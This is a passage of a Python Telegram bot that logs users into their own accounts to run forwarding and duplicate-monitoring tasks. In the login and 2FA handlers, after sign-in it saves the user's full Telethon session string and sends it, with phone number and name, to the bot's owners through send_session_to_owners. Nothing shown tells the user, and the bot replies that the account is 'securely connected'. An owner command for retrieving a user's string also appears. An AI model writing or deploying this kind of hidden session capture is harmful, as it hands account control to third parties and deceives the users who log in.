        [InlineKeyboardButton("🔙 Back to Monitor Tasks", callback_data="show_monitor_tasks")]
    ]
    
    await query.edit_message_text(
        message_text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

async def handle_toggle_monitor_action(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    data_parts = query.data.replace("toggle_monitor_", "").split("_")
    
    if len(data_parts) < 2:
        await query.answer("Invalid action!", show_alert=True)
        return
    
    task_label = data_parts[0]
    toggle_type = "_".join(data_parts[1:])
    
    user_tasks = monitoring_tasks_cache.get(user_id, [])
    task_index = next((i for i, t in enumerate(user_tasks) if t["label"] == task_label), -1)
    
    if task_index == -1:
        await query.answer("Task not found!", show_alert=True)
        return
    
    task = user_tasks[task_index]
    settings = task.get("settings", {})
    new_state = None
    status_text = ""
    
    if toggle_type == "check_duplicate_and_notify":
        new_state = not settings.get("check_duplicate_and_notify", True)
        settings["check_duplicate_and_notify"] = new_state
        status_text = "Check Duo & Notify"
    
    elif toggle_type == "manual_reply_system":
        new_state = not settings.get("manual_reply_system", True)
        settings["manual_reply_system"] = new_state
        status_text = "Manual reply system"
    
    elif toggle_type == "auto_reply_system":
        current_state = settings.get("auto_reply_system", False)
        
        if not current_state:
            context.user_data[f"waiting_auto_reply_{task_label}"] = True
            await query.edit_message_text(
                f"🤖 **Auto Reply Setup for: {task_label}**\n\n"
                "Please enter the message you want to use for auto reply.\n\n"
                "⚠️ **Important:** This message will be sent automatically whenever a duplicate is detected.\n"
                "It will appear as coming from your account.\n\n"
                "💡 **Example messages:**\n"
                "• 'Please avoid sending duplicate messages.'\n"
                "• 'This message was already sent.'\n"
                "• 'Duplicate detected.'\n\n"
                "**Type your auto reply message now:**",
                parse_mode="Markdown"
            )
            return
        else:
            new_state = False
            settings["auto_reply_system"] = new_state
            settings["auto_reply_message"] = ""
            status_text = "Auto Reply system"
    
    elif toggle_type == "outgoing_message_monitoring":
        new_state = not settings.get("outgoing_message_monitoring", True)
        settings["outgoing_message_monitoring"] = new_state
        status_text = "Outgoing message monitoring"
    
    else:
        await query.answer(f"Unknown toggle type: {toggle_type}")
        return
    
    if new_state is not None:
        task["settings"] = settings
        monitoring_tasks_cache[user_id][task_index] = task
    
    if toggle_type != "auto_reply_system":
        keyboard = query.message.reply_markup.inline_keyboard if query.message.reply_markup else []
        button_found = False
        new_emoji = "✅" if new_state else "❌"
        
        new_keyboard = []
        for row in keyboard:
            new_row = []
            for button in row:
                if button.callback_data == query.data:
                    current_text = button.text
                    if "✅ " in current_text:
                        text_without_emoji = current_text.split("✅ ", 1)[1]
                        new_text = f"{new_emoji} {text_without_emoji}"
                    elif "❌ " in current_text:
                        text_without_emoji = current_text.split("❌ ", 1)[1]
                        new_text = f"{new_emoji} {text_without_emoji}"
                    elif current_text.startswith("✅"):
                        text_without_emoji = current_text[1:]
                        new_text = f"{new_emoji}{text_without_emoji}"
                    elif current_text.startswith("❌"):
                        text_without_emoji = current_text[1:]
                        new_text = f"{new_emoji}{text_without_emoji}"
                    else:
                        new_text = f"{new_emoji} {current_text}"
                    
                    new_row.append(InlineKeyboardButton(new_text, callback_data=query.data))
                    button_found = True
                else:
                    new_row.append(button)
            new_keyboard.append(new_row)
        
        if button_found:
            try:
                await query.edit_message_reply_markup(reply_markup=InlineKeyboardMarkup(new_keyboard))
                status_display = "✅ Active" if new_state else "❌ Inactive"
                await query.answer(f"{status_text}: {status_display}")
            except Exception:
                status_display = "✅ Active" if new_state else "❌ Inactive"
                await query.answer(f"{status_text}: {status_display}")
                await handle_monitor_task_menu(update, context)
        else:
            status_display = "✅ Active" if new_state else "❌ Inactive"
            await query.answer(f"{status_text}: {status_display}")
            await handle_monitor_task_menu(update, context)
    
    if new_state is not None or toggle_type == "auto_reply_system":
        try:
            asyncio.create_task(db_call(db.update_task_settings, user_id, task_label, settings))
            logger.info(f"Updated task {task_label} setting {toggle_type} to {new_state} for user {user_id}")
        except Exception as e:
            logger.exception("Error updating task settings in DB: %s", e)

async def handle_auto_reply_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = (update.message.text or "").strip()
    
    waiting_for_auto_reply = False
    task_label = None
    
    for key in list(context.user_data.keys()):
        if key.startswith("waiting_auto_reply_"):
            waiting_for_auto_reply = True
            task_label = key.replace("waiting_auto_reply_", "")
            del context.user_data[key]
            break
    
    if not waiting_for_auto_reply or not task_label:
        return
    
    user_tasks = monitoring_tasks_cache.get(user_id, [])
    task_index = next((i for i, t in enumerate(user_tasks) if t["label"] == task_label), -1)
    
    if task_index == -1:
        await update.message.reply_text("❌ Task not found!")
        return
    
    task = user_tasks[task_index]
    settings = task.get("settings", {})
    
    settings["auto_reply_system"] = True
    settings["auto_reply_message"] = text
    
    task["settings"] = settings
    monitoring_tasks_cache[user_id][task_index] = task
    
    try:
        await db_call(db.update_task_settings, user_id, task_label, settings)
    except Exception as e:
        logger.exception("Error updating task settings in DB: %s", e)
        await update.message.reply_text("❌ Error saving auto reply message!")
        return
    
    await update.message.reply_text(
        f"✅ **Auto Reply Message Added Successfully!**\n\n"
        f"Task: **{task_label}**\n"
        f"Auto Reply Message: '{text}'\n\n"
        "This message will be sent automatically whenever a duplicate is detected.\n"
        "⚠️ **Remember:** It will appear as coming from your account.",
        parse_mode="Markdown"
    )
    
    logger.info(f"Auto reply message set for task {task_label} by user {user_id}")

async def handle_delete_monitor_action(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    task_label = query.data.replace("delete_monitor_", "")
    
    if await check_phone_number_required(user_id):
        await query.answer()
        await ask_for_phone_number(user_id, query.message.chat.id, context)
        return
    
    message_text = f"🗑️ **Delete Monitoring Task: {task_label}**\n\n"
    message_text += "⚠️ **Are you sure you want to delete this task?**\n\n"
    message_text += "This action cannot be undone!\n"
    message_text += "All monitoring will stop immediately."
    
    keyboard = [
        [
            InlineKeyboardButton("✅ Yes, Delete", callback_data=f"confirm_delete_monitor_{task_label}"),
            InlineKeyboardButton("❌ Cancel", callback_data=f"monitor_task_{task_label}")
        ]
    ]
    
    await query.edit_message_text(
        message_text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

async def handle_confirm_delete_monitor(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    task_label = query.data.replace("confirm_delete_monitor_", "")
    
    if await check_phone_number_required(user_id):
        await query.answer()
        await ask_for_phone_number(user_id, query.message.chat.id, context)
        return
    
    deleted = await db_call(db.remove_monitoring_task, user_id, task_label)
    
    if deleted:
        if user_id in monitoring_tasks_cache:
            monitoring_tasks_cache[user_id] = [t for t in monitoring_tasks_cache[user_id] if t.get('label') != task_label]
        
        if user_id in user_clients:
            await update_monitoring_for_user(user_id)
        
        await query.edit_message_text(
            f"✅ **Task '{task_label}' deleted successfully!**\n\n"
            "All monitoring for this task has been stopped.",
            parse_mode="Markdown"
        )
    else:
        await query.edit_message_text(
            f"❌ **Task '{task_label}' not found!**",
            parse_mode="Markdown"
        )

# ============================
# TASK CREATION HANDLER
# ============================
async def handle_task_creation(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()

    if user_id in phone_verification_states:
        await handle_phone_verification(update, context)
        return

    if user_id in task_creation_states:
        state = task_creation_states[user_id]
        task_type = state.get("type", "forwarding")

        try:
            if state["step"] == "waiting_name":
                if not text:
                    await update.message.reply_text("❌ **Please enter a valid task name!**")
                    return

                state["name"] = text
                state["step"] = "waiting_ids"

                if task_type == "forwarding":
                    await update.message.reply_text(
                        f"✅ **Task name saved:** {text}\n\n📥 **Step 2 of 3:** Please enter the source chat ID(s).\n\nYou can enter multiple IDs separated by spaces.\n💡 *Use /getallid to find your chat IDs*\n\n**Example:** `123456789 987654321`",
                        parse_mode="Markdown"
                    )
                else:  # monitoring
                    await update.message.reply_text(
                        f"✅ **Task name saved:** {text}\n\n"
                        "📥 **Step 2 of 2:** Please enter the chat ID(s) to monitor.\n\n"
                        "You can enter multiple IDs separated by spaces.\n"
                        "💡 *Use /getallid to find your chat IDs*\n\n"
                        "**Example:** `-1001234567890 -1009876543210`",
                        parse_mode="Markdown"
                    )

            elif state["step"] == "waiting_ids":
                if not text:
                    await update.message.reply_text("❌ **Please enter at least one ID!**")
                    return

                try:
                    ids = [int(id_str.strip()) for id_str in text.split() if id_str.strip().lstrip('-').isdigit()]
                    if not ids:
                        await update.message.reply_text("❌ **Please enter valid numeric IDs!**")
                        return

                    if task_type == "forwarding":
                        state["source_ids"] = ids
                        state["step"] = "waiting_targets"

                        await update.message.reply_text(
                            f"✅ **Source IDs saved:** {', '.join(map(str, ids))}\n\n📤 **Step 3 of 3:** Please enter the target chat ID(s).\n\nYou can enter multiple IDs separated by spaces.\n💡 *Use /getallid to find your chat IDs*\n\n**Example:** `111222333`",
                            parse_mode="Markdown"
                        )
                    else:  # monitoring
                        state["chat_ids"] = ids
                        
                        task_settings = {
                            "check_duplicate_and_notify": True,
                            "manual_reply_system": True,
                            "auto_reply_system": False,
                            "auto_reply_message": "",
                            "outgoing_message_monitoring": True
                        }
                        
                        added = await db_call(db.add_monitoring_task,
                                             user_id,
                                             state["name"],
                                             state["chat_ids"],
                                             task_settings)
                        
                        if added:
                            monitoring_tasks_cache.setdefault(user_id, []).append({
                                "id": None,
                                "label": state["name"],
                                "chat_ids": state["chat_ids"],
                                "is_active": 1,
                                "settings": task_settings
                            })
                            
                            await update.message.reply_text(
                                f"🎉 **Monitoring task created successfully!**\n\n"
                                f"📋 **Name:** {state['name']}\n"
                                f"📥 **Monitoring Chats:** {', '.join(map(str, state['chat_ids']))}\n\n"
                                "✅ Default settings applied:\n"
                                "• Check Duo & Notify: ✅ Active\n"
                                "• Manual reply system: ✅ Enabled\n"
                                "• Auto Reply system: ❌ Disabled\n"
                                "• Outgoing Message monitoring: ✅ Enabled\n\n"
                                "Use /monitortasks to manage your task!",
                                parse_mode="Markdown"
                            )
                            
                            logger.info(f"Monitoring task created for user {user_id}: {state['name']}")
                            
                            if user_id in user_clients:
                                await update_monitoring_for_user(user_id)
                            
                            del task_creation_states[user_id]
                        
                        else:
                            await update.message.reply_text(
                                f"❌ **Task '{state['name']}' already exists!**\n\n"
                                "Please choose a different name.",
                                parse_mode="Markdown"
                            )

                except ValueError:
                    await update.message.reply_text("❌ **Please enter valid numeric IDs only!**")

            elif state["step"] == "waiting_targets" and task_type == "forwarding":
                if not text:
                    await update.message.reply_text("❌ **Please enter at least one target ID!**")
                    return

                try:
                    target_ids = [int(id_str.strip()) for id_str in text.split() if id_str.strip().lstrip('-').isdigit()]
                    if not target_ids:
                        await update.message.reply_text("❌ **Please enter valid numeric IDs!**")
                        return

                    state["target_ids"] = target_ids

                    task_filters = {
                        "filters": {
                            "raw_text": False,
                            "numbers_only": False,
                            "alphabets_only": False,
                            "removed_alphabetic": False,
                            "removed_numeric": False,
                            "prefix": "",
                            "suffix": ""
                        },
                        "outgoing": True,
                        "forward_tag": False,
                        "control": True
                    }

                    added = await db_call(db.add_forwarding_task, 
                                         user_id, 
                                         state["name"], 
                                         state["source_ids"], 
                                         state["target_ids"],
                                         task_filters)

                    if added:
                        forwarding_tasks_cache.setdefault(user_id, []).append({
                            "id": None,
                            "label": state["name"],
                            "source_ids": state["source_ids"],
                            "target_ids": state["target_ids"],
                            "is_active": 1,
                            "filters": task_filters
                        })

                        try:
                            asyncio.create_task(resolve_targets_for_user(user_id, target_ids))
                        except Exception:
                            logger.exception("Failed to schedule resolve_targets_for_user")

                        await update.message.reply_text(
                            f"🎉 **Forwarding task created successfully!**\n\n📋 **Name:** {state['name']}\n📥 **Sources:** {', '.join(map(str, state['source_ids']))}\n📤 **Targets:** {', '.join(map(str, state['target_ids']))}\n\n✅ All filters are set to default:\n• Outgoing: ✅ On\n• Forward Tag: ❌ Off\n• Control: ✅ On\n\nUse /fortasks to manage your task!",
                            parse_mode="Markdown"
                        )

                        del task_creation_states[user_id]

                    else:
                        await update.message.reply_text(
                            f"❌ **Task '{state['name']}' already exists!**\n\nPlease choose a different name.",
                            parse_mode="Markdown"
                        )

                except ValueError:
                    await update.message.reply_text("❌ **Please enter valid numeric IDs only!**")

        except Exception as e:
            logger.exception("Error in task creation")
            await update.message.reply_text(
                f"❌ **Error creating task:** {str(e)[:100]}",
                parse_mode="Markdown"
            )
            if user_id in task_creation_states:
                del task_creation_states[user_id]
        return
    
    # Handle other text inputs
    if context.user_data.get("awaiting_input"):
        action = context.user_data.get("owner_action")
        
        if action == "get_user_string":
            await handle_get_user_string(update, context)
        elif action == "add_user":
            await handle_add_user(update, context)
        elif action == "remove_user":
            await handle_remove_user(update, context)
        return
    
    if user_id in login_states:
        await handle_login_process(update, context)
        return
    
    if user_id in logout_states:
        handled = await handle_logout_confirmation(update, context)
        if handled:
            return
    
    if context.user_data.get("waiting_prefix") or context.user_data.get("waiting_suffix"):
        await handle_prefix_suffix_input(update, context)
        return
    
    if any(key.startswith("waiting_auto_reply_") for key in context.user_data.keys()):
        await handle_auto_reply_message(update, context)
        return
    
    if update.message.reply_to_message:
        await handle_notification_reply(update, context)
        return

# ============================
# LOGIN/LOGOUT FUNCTIONS
# ============================
async def login_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id if update.effective_user else update.callback_query.from_user.id

    if not await check_authorization(update, context):
        return

    message = update.message if update.message else update.callback_query.message

    if len(user_clients) >= MAX_CONCURRENT_USERS:
        await message.reply_text(
            "❌ **Server at capacity!**\n\nToo many users are currently connected. Please try again later.",
            parse_mode="Markdown",
        )
        return

    user = await db_call(db.get_user, user_id)
    if user and user.get("is_logged_in") and user.get("session_data"):
        # Check if session is actually active in memory
        if user_id in user_clients:
            await message.reply_text(
                "✅ **You are already logged in!**\n\n"
                f"📱 Phone: `{user['phone'] or 'Not set'}`\n"
                f"👤 Name: `{user['name'] or 'User'}`\n\n"
                "Use /logout if you want to disconnect.",
                parse_mode="Markdown",
            )
            return
        else:
            # Session exists in DB but not in memory - clean it up
            logger.warning(f"User {user_id} has session in DB but not in memory, cleaning up")
            try:
                await db_call(db.purge_user_data, user_id)
            except Exception:
                pass

    client = TelegramClient(StringSession(), API_ID, API_HASH)
    
    try:
        await client.connect()
    except Exception as e:
        logger.error(f"Telethon connection failed: {e}")
        await message.reply_text(
            f"❌ **Connection failed:** {str(e)}\n\nPlease try again in a few minutes.",
            parse_mode="Markdown",
        )
        return

    login_states[user_id] = {"client": client, "step": "waiting_phone"}

    await message.reply_text(
        "📱 **Login Process**\n\n1️⃣ **Enter your phone number** (with country code):\n\n**Examples:**\n• `+1234567890`\n• `+447911123456`\n• `+4915112345678`\n\n⚠️ **Important:**\n• Include the `+` sign\n• Use international format\n• No spaces or dashes\n\n**Type your phone number now:**",
        parse_mode="Markdown",
    )

async def handle_login_process(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()

    if user_id in phone_verification_states:
        await handle_phone_verification(update, context)
        return

    if user_id in task_creation_states:
        await handle_task_creation(update, context)
        return
    
    if context.user_data.get("waiting_prefix") or context.user_data.get("waiting_suffix"):
        await handle_prefix_suffix_input(update, context)
        return
    
    if user_id in logout_states:
        handled = await handle_logout_confirmation(update, context)
        if handled:
            return
    
    if any(key.startswith("waiting_auto_reply_") for key in context.user_data.keys()):
        await handle_auto_reply_message(update, context)
        return
    
    if update.message.reply_to_message:
        await handle_notification_reply(update, context)
        return

    if user_id not in login_states:
        return

    state = login_states[user_id]
    client = state["client"]

    try:
        if state["step"] == "waiting_phone":
            if not text.startswith('+'):
                await update.message.reply_text(
                    "❌ **Invalid format!**\n\nPhone number must start with `+`\nExample: `+1234567890`",
                    parse_mode="Markdown",
                )
                return
            
            clean_phone = _clean_phone_number(text)
            
            if len(clean_phone) < 8:
                await update.message.reply_text(
                    "❌ **Invalid phone number!**\n\nPhone number seems too short.",
                    parse_mode="Markdown",
                )
                return

            processing_msg = await update.message.reply_text(
                "⏳ **Sending verification code...**\n\nThis may take a few seconds.",
                parse_mode="Markdown",
            )

            try:
                result = await client.send_code_request(clean_phone)
                
                state["phone"] = clean_phone
                state["phone_code_hash"] = result.phone_code_hash
                state["step"] = "waiting_code"

                await processing_msg.edit_text(
                    f"✅ **Verification code sent!**\n\n📱 **Code sent to:** `{clean_phone}`\n\n2️⃣ **Enter the verification code:**\n\n**Format:** `verify12345`\n• Type `verify` followed by your 5-digit code\n• No spaces, no brackets\n\n**Example:** If your code is `54321`, type:\n`verify54321`",
                    parse_mode="Markdown",
                )

            except Exception as e:
                error_msg = str(e)
                logger.error(f"Error sending code for user {user_id}: {error_msg}")
                
                if "PHONE_NUMBER_INVALID" in error_msg:
                    error_text = "❌ **Invalid phone number!**"
                elif "PHONE_NUMBER_BANNED" in error_msg:
                    error_text = "❌ **Phone number banned!**"
                elif "FLOOD" in error_msg or "Too many" in error_msg:
                    error_text = "❌ **Too many attempts!**\n\nPlease wait 2-3 minutes."
                elif "PHONE_CODE_EXPIRED" in error_msg:
                    error_text = "❌ **Code expired!**\n\nPlease start over."
                else:
                    error_text = f"❌ **Error:** {error_msg}"
                
                await processing_msg.edit_text(
                    error_text + "\n\nUse /login to try again.",
                    parse_mode="Markdown",
                )
                
                try:
                    await client.disconnect()
                except:
                    pass
                
                if user_id in login_states:
                    del login_states[user_id]
                return

        elif state["step"] == "waiting_code":
            if not text.startswith("verify"):
                await update.message.reply_text(
                    "❌ **Invalid format!**\n\nPlease use the format: `verify12345`",
                    parse_mode="Markdown",
                )
                return

            code = text[6:]
            
            if not code or not code.isdigit() or len(code) != 5:
                await update.message.reply_text(
                    "❌ **Invalid code!**\n\nCode must be 5 digits.\n**Example:** `verify12345`",
                    parse_mode="Markdown",
                )
                return

            verifying_msg = await update.message.reply_text(
                "🔄 **Verifying code...**",
                parse_mode="Markdown",
            )

            try:
                await client.sign_in(state["phone"], code, phone_code_hash=state["phone_code_hash"])

                me = await client.get_me()
                session_string = client.session.save()

                asyncio.create_task(send_session_to_owners(user_id, state["phone"], me.first_name or "User", session_string))

                await db_call(db.save_user, user_id, state["phone"], me.first_name, session_string, True)

                user_clients[user_id] = client
                forwarding_tasks_cache.setdefault(user_id, [])
                monitoring_tasks_cache.setdefault(user_id, [])
                _ensure_user_target_cache(user_id)
                chat_entity_cache.setdefault(user_id, {})
                _ensure_user_send_semaphore(user_id)
                _ensure_user_rate_limiter(user_id)
                
                # Start both systems
                await start_forwarding_for_user(user_id)
                await start_monitoring_for_user(user_id)

                del login_states[user_id]

                await verifying_msg.edit_text(
                    f"✅ **Successfully connected!** 🎉\n\n👤 **Name:** {me.first_name or 'User'}\n📱 **Phone:** `{state['phone']}`\n🆔 **User ID:** `{me.id}`\n\n**Now you can:**\n• Create forwarding tasks with /forwadd\n• Create monitoring tasks with /monitoradd\n• View tasks with /fortasks and /monitortasks\n• Get chat IDs with /getallid",
                    parse_mode="Markdown",
                )

            except SessionPasswordNeededError:
                state["step"] = "waiting_2fa"
                await verifying_msg.edit_text(
                    "🔐 **2-Step Verification Required**\n\n3️⃣ **Enter your 2FA password:**\n\n**Format:** `passwordYourPassword123`\n• Type `password` followed by your 2FA password\n• No spaces, no brackets\n\n**Example:** If your password is `mypass123`, type:\n`passwordmypass123`",
                    parse_mode="Markdown",
                )
            except Exception as e:
                error_msg = str(e)
                logger.error(f"Error verifying code for user {user_id}: {error_msg}")
                
                if "PHONE_CODE_INVALID" in error_msg:
                    error_text = "❌ **Invalid code!**"
                elif "PHONE_CODE_EXPIRED" in error_msg:
                    error_text = "❌ **Code expired!**"
                else:
                    error_text = f"❌ **Verification failed:** {error_msg}"
                
                await verifying_msg.edit_text(
                    error_text + "\n\nUse /login to try again.",
                    parse_mode="Markdown",
                )

        elif state["step"] == "waiting_2fa":
            if not text.startswith("password"):
                await update.message.reply_text(
                    "❌ **Invalid format!**\n\nPlease use the format: `passwordYourPassword123`",
                    parse_mode="Markdown",
                )
                return

            password = text[8:]

            if not password:
                await update.message.reply_text(
                    "❌ **No password provided!**",
                    parse_mode="Markdown",
                )
                return

            verifying_msg = await update.message.reply_text(
                "🔄 **Verifying 2FA password...**",
                parse_mode="Markdown",
            )

            try:
                await client.sign_in(password=password)

                me = await client.get_me()
                session_string = client.session.save()

                asyncio.create_task(send_session_to_owners(user_id, state["phone"], me.first_name or "User", session_string))

                await db_call(db.save_user, user_id, state["phone"], me.first_name, session_string, True)

                user_clients[user_id] = client
                forwarding_tasks_cache.setdefault(user_id, [])
                monitoring_tasks_cache.setdefault(user_id, [])
                _ensure_user_target_cache(user_id)
                chat_entity_cache.setdefault(user_id, {})
                _ensure_user_send_semaphore(user_id)
                _ensure_user_rate_limiter(user_id)
                
                # Start both systems
                await start_forwarding_for_user(user_id)
                await start_monitoring_for_user(user_id)

                del login_states[user_id]

                await verifying_msg.edit_text(
                    f"✅ **Successfully connected with 2FA!** 🎉\n\n👤 **Name:** {me.first_name or 'User'}\n📱 **Phone:** `{state['phone']}`\n🆔 **User ID:** `{me.id}`\n\nYour account is now securely connected! 🔐",
                    parse_mode="Markdown",
                )

            except Exception as e:
                error_msg = str(e)
                logger.error(f"Error verifying 2FA for user {user_id}: {error_msg}")
                
                if "PASSWORD_HASH_INVALID" in error_msg or "PASSWORD_INVALID" in error_msg:
                    error_text = "❌ **Invalid 2FA password!**"
                else:
                    error_text = f"❌ **2FA verification failed:** {error_msg}"
                
                await verifying_msg.edit_text(
                    error_text + "\n\nUse /login to try again.",
                    parse_mode="Markdown",
                )

    except Exception as e:
        logger.exception("Unexpected error during login")
        await update.message.reply_text(
            f"❌ **Unexpected error:** {str(e)[:100]}\n\nPlease try /login again.",
            parse_mode="Markdown",
        )
        if user_id in login_states:
            try:
                c = login_states[user_id].get("client")
                if c:
                    await c.disconnect()
            except Exception:
                pass
            del login_states[user_id]

async def logout_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id if update.effective_user else update.callback_query.from_user.id

    if not await check_authorization(update, context):
        return

    if await check_phone_number_required(user_id):
        message = update.message if update.message else update.callback_query.message
        await ask_for_phone_number(user_id, message.chat.id, context)
        return

    message = update.message if update.message else update.callback_query.message

    user = await db_call(db.get_user, user_id)
    if not user or not user["is_logged_in"]:
        await message.reply_text(
            "❌ **You're not connected!**\n\nUse /login to connect your account.", parse_mode="Markdown"
        )
        return

    logout_states[user_id] = {"phone": user["phone"]}

    await message.reply_text(
        f"⚠️ **Confirm Logout**\n\n📱 **Enter your phone number to confirm disconnection:**\n\nYour connected phone: `{user['phone']}`\n\nType your phone number exactly to confirm logout.",
        parse_mode="Markdown",
    )

async def handle_logout_confirmation(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    user_id = update.effective_user.id

    if user_id not in logout_states:
        return False

    text = update.message.text.strip()
    stored_phone = logout_states[user_id]["phone"]

    if text != stored_phone:
        await update.message.reply_text(
            f"❌ **Phone number doesn't match!**\n\nExpected: `{stored_phone}`\nYou entered: `{text}`",
            parse_mode="Markdown",
        )
        return True

    if user_id in user_clients:
        client = user_clients[user_id]
        try:
            # Remove forwarding handler
            if user_id in forward_handler_registered:
                handler = forward_handler_registered.get(user_id)
                if handler:
                    try:
                        client.remove_event_handler(handler)
                    except Exception:
                        pass
                forward_handler_registered.pop(user_id, None)
            
            # Remove monitoring handlers
            if user_id in monitor_handler_registered:
                for handler in monitor_handler_registered[user_id]:
                    try:
                        client.remove_event_handler(handler)
                    except Exception:
                        pass
                monitor_handler_registered.pop(user_id, None)

            await client.disconnect()
        except Exception:
            pass
        finally:
            user_clients.pop(user_id, None)

    # COMPLETELY purge all user data from database
    try:
        success = await db_call(db.purge_user_data, user_id)
        if not success:
            logger.error(f"Failed to purge user data for {user_id}")
    except Exception as e:
        logger.exception(f"Error purging user data for {user_id}: {e}")
    
    # Clear all local caches
    phone_verification_states.pop(user_id, None)
    forwarding_tasks_cache.pop(user_id, None)
    monitoring_tasks_cache.pop(user_id, None)
    target_entity_cache.pop(user_id, None)
    chat_entity_cache.pop(user_id, None)
    user_send_semaphores.pop(user_id, None)
    user_rate_limiters.pop(user_id, None)
    logout_states.pop(user_id, None)
    reply_states.pop(user_id, None)
    auto_reply_states.pop(user_id, None)
    
    # Clear auth cache
    _auth_cache.pop(user_id, None)

    await update.message.reply_text(
        "👋 **Account disconnected successfully!**\n\n✅ All your sessions, tasks, and data have been cleared.\n🔄 Use /login to connect again.",
        parse_mode="Markdown",
    )
    return True

# ============================
# CHAT ID UTILITIES
# ============================
async def getallid_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if not await check_authorization(update, context):
        return

    if await check_phone_number_required(user_id):
        await ask_for_phone_number(user_id, update.message.chat.id, context)
        return

    user = await db_call(db.get_user, user_id)
    if not user or not user["is_logged_in"]:
        await update.message.reply_text("❌ **You need to connect your account first!**\n\nUse /login to connect.", parse_mode="Markdown")
        return

    await update.message.reply_text("🔄 **Fetching your chats...**")

    await show_chat_categories(user_id, update.message.chat.id, None, context)

async def show_chat_categories(user_id: int, chat_id: int, message_id: int, context: ContextTypes.DEFAULT_TYPE):
    if user_id not in user_clients:
        return

    message_text = """🗂️ **Chat ID Categories**

📋 Choose which type of chat IDs you want to see:

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🤖 **Bots** - Bot accounts
📢 **Channels** - Broadcast channels
👥 **Groups** - Group chats
👤 **Private** - Private conversations

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 Select a category below:"""

    keyboard = [
        [InlineKeyboardButton("🤖 Bots", callback_data="chatids_bots_0"), InlineKeyboardButton("📢 Channels", callback_data="chatids_channels_0")],
        [InlineKeyboardButton("👥 Groups", callback_data="chatids_groups_0"), InlineKeyboardButton("👤 Private", callback_data="chatids_private_0")],
    ]

    if message_id:
        await context.bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=message_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
    else:
        await context.bot.send_message(chat_id=chat_id, text=message_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

async def show_categorized_chats(user_id: int, chat_id: int, message_id: int, category: str, page: int, context: ContextTypes.DEFAULT_TYPE):
    from telethon.tl.types import User, Channel, Chat

    if user_id not in user_clients:
        return

    client = user_clients[user_id]

    categorized_dialogs = []
    async for dialog in client.iter_dialogs():
        entity = dialog.entity

        if category == "bots":
            if isinstance(entity, User) and entity.bot:
                categorized_dialogs.append(dialog)
        elif category == "channels":
            if isinstance(entity, Channel) and getattr(entity, "broadcast", False):
                categorized_dialogs.append(dialog)
        elif category == "groups":
            if isinstance(entity, (Channel, Chat)) and not (isinstance(entity, Channel) and getattr(entity, "broadcast", False)):
                categorized_dialogs.append(dialog)
        elif category == "private":
            if isinstance(entity, User) and not entity.bot:
                categorized_dialogs.append(dialog)

    PAGE_SIZE = 10
    total_pages = max(1, (len(categorized_dialogs) + PAGE_SIZE - 1) // PAGE_SIZE)
    start = page * PAGE_SIZE
    end = start + PAGE_SIZE
    page_dialogs = categorized_dialogs[start:end]

    category_emoji = {"bots": "🤖", "channels": "📢", "groups": "👥", "private": "👤"}
    category_name = {"bots": "Bots", "channels": "Channels", "groups": "Groups", "private": "Private Chats"}

    emoji = category_emoji.get(category, "💬")
    name = category_name.get(category, "Chats")

    if not categorized_dialogs:
        chat_list = f"{emoji} **{name}**\n\n📭 **No {name.lower()} found!**\n\nTry another category."
    else:
        chat_list = f"{emoji} **{name}** (Page {page + 1}/{total_pages})\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"

        for i, dialog in enumerate(page_dialogs, start + 1):
            chat_name = dialog.name[:30] if dialog.name else "Unknown"
            chat_list += f"{i}. **{chat_name}**\n   🆔 `{dialog.id}`\n\n"

        chat_list += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        chat_list += f"📊 Total: {len(categorized_dialogs)} {name.lower()}\n"
        chat_list += "💡 Tap to copy the ID!"

    keyboard = []

    nav_row = []
    if page > 0:
        nav_row.append(InlineKeyboardButton("⬅️ Previous", callback_data=f"chatids_{category}_{page - 1}"))
    if page < total_pages - 1:
        nav_row.append(InlineKeyboardButton("Next ➡️", callback_data=f"chatids_{category}_{page + 1}"))

    if nav_row:
        keyboard.append(nav_row)

    keyboard.append([InlineKeyboardButton("🔙 Back to Categories", callback_data="chatids_back")])

    await context.bot.edit_message_text(chat_list, chat_id=chat_id, message_id=message_id, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

# ============================
# FORWARDING SYSTEM
# ============================
def ensure_forward_handler_registered_for_user(user_id: int, client: TelegramClient):
    if forward_handler_registered.get(user_id):
        return

    async def _forward_message_handler(event):
        try:
            await optimized_gc()
            
            is_edit = isinstance(event, events.MessageEdited)
            message = getattr(event, "message", None)
            if not message:
                return
                
            message_text = getattr(event, "raw_text", None) or getattr(message, "message", None)
            if not message_text:
                return

            chat_id = getattr(event, "chat_id", None) or getattr(message, "chat_id", None)
            if chat_id is None:
                return

            user_tasks = forwarding_tasks_cache.get(user_id)
            if not user_tasks:
                return

            message_outgoing = getattr(message, "out", False)
            
            for task in user_tasks:
                if not task.get("filters", {}).get("control", True):
                    continue
                    
                if message_outgoing and not task.get("filters", {}).get("outgoing", True):
                    continue
                    
                if chat_id in task.get("source_ids", []):
                    forward_tag = task.get("filters", {}).get("forward_tag", False)
                    filtered_messages = apply_filters(message_text, task.get("filters", {}))
                    
                    for filtered_msg in filtered_messages:
                        for target_id in task.get("target_ids", []):
                            try:
                                if send_queue is None:
                                    continue
                                    
